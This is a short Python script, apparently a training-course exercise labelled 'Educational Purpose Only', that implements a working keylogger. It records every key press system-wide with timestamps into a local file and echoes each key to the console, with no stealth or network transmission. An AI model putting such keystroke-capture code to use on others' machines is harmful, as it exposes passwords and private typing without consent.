import keyboard
import datetime
import os

LOG_FILE = "keylog.txt"

print("=" * 65)
print("   SIMPLE KEYLOGGER - TASK-04 (Prodigy Infotech)")
print("   Educational Purpose Only")
print("=" * 65)
print("Keylogger is running... Type anything.")
print("Press Ctrl + C to stop.\n")

# Create clean log file
with open(LOG_FILE, "w", encoding="utf-8") as f:
    f.write(f"=== Keylogger Started: {datetime.datetime.now()} ===\n")
    f.write("=" * 60 + "\n\n")

def on_key(event):
    if event.event_type == keyboard.KEY_DOWN:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key = event.name

        if key == "space":
            log_entry = "[SPACE]"
            display = "[SPACE]"
        elif key == "enter":
            log_entry = "[ENTER]"
            display = "[ENTER]"
        elif key == "backspace":
            log_entry = "[BACKSPACE]"
            display = "[BACKSPACE]"
        elif len(key) > 1:
            log_entry = f"[{key.upper()}]"
            display = f"[{key.upper()}]"
        else:
            log_entry = key
            display = key

        # Save to file
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} | {log_entry}\n")

        # Live display (clean)
        print(f"[{timestamp}] {display}")

print("Listening...\n")

try:
    keyboard.on_press(on_key)
    while True:
        pass
except KeyboardInterrupt:
    print("\n" + "="*65)
    print("✅ Keylogger stopped successfully!")
    print(f"📁 Log file saved: {os.path.abspath(LOG_FILE)}")
    print("\nFinal Log Preview:")
    print("-" * 40)
    with open(LOG_FILE, "r") as f:
        print(f.read()[-500:])  # Show last 500 characters
    print("="*65)
